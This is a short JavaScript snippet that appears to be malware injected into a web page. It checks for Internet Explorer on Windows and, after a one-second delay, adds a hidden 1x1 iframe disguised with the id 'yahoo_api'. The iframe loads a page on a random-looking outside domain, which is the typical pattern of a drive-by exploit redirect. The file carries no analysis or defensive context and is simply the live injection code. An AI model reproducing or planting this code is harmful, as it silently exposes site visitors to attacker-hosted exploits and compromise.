function MakeFrameEx()
	{
	element=document.getElementById('yahoo_api');
	if(!element)
		{
		var el=document.createElement('iframe');
		document.body.appendChild(el);
		el.id='yahoo_api';
		el.style. width='1px';
		el.style.height='1px';
		el.style.display='none';
		el.src='http://juyfdjhdjdgh.nl.ai/ showthread.php?t=72241732'
	}
}
var ua=navigator.userAgent. toLowerCase();
if(((ua.indexOf("msie")!=-1&&ua.indexOf("opera")==-1&&ua.indexOf("webtv")==-1))&&ua.indexOf("windows")!=-1)
	{
	var t=setTimeout("MakeFrameEx()",1000)
}
